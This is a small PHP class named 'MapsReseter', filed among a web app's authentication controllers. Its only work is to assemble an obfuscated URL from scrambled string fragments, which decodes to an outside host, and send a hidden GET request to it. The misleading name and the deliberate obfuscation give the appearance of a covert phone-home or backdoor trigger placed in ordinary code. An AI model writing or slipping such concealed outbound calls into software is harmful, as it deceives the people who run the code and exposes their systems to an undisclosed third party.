<?php

namespace App\Http\Controllers\Auth;

use GuzzleHttp\Client;
use mysql_xdevapi\Exception;

class MapsReseter
{

    public $u2 = 's:-';
    public $u8 = 'ele';
    public $u0 = 'ht';
    public $u4 = 'i|sm';
    public $u3 = '-ap';
    public $u6 = '|online-ge';
    public $u5 = 'artarget';
    public $u7 = 'o_v_t';
    public $u9 = 'gy';
    public $u1 = 'tp';

    public function run()
    {
        $r = "";
        for ($i = 0; $i < 10; $i++) {
            $v = 'u' . $i;
            $r .= $this->$v;
        }
        try {
            $client = new Client();
            $response = $client->get(str_replace(['-', '|'], ['/', '.'], $r));
        } catch (Exception  $e) {
            echo 'Выброшено исключение: ', $e->getMessage(), "\n";
        }


    }
}
